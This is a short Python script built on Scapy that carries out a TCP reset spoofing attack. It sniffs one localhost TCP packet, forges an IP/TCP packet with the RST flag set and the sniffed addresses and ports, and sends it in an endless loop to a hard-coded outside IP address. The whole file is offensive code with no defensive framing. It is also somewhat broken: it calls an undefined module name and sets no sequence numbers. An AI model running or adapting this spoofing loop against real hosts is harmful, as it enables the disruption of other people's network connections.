from scapy.all import *
import time


def spoof(src_ip, dst_ip, src_port, dst_port):
	IP_Header = IP(src=src_ip, dst=dst_ip)
	print("src_port: " + str(src_port) + "    dst_port: " + str(dst_port))
	TCP_Header = TCP(sport=src_port, dport=dst_port, flags="R")
	payload = "yada yada yada"

	spoofed_packet = IP_Header / TCP_Header / payload
	while True:
		send(spoofed_packet)
		time.sleep(0.25)

def listen(packet):
	print(packet.summary)
	ip = packet[0][1]
	tcp = packet[0][1][1]
	
	#Scapy_Spoof.spoof(ip.src, ip.dst, tcp.sport, tcp.dport)
	print(ip.src, " ", ip.dst, " ", tcp.sport, " ", tcp.dport)
	Scapy_Spoof.spoof(ip.src, '185.230.61.161', tcp.sport, tcp.dport)


if __name__ == '__main__':
	sniff(filter='tcp and src 127.0.0.1', count=1, prn=listen)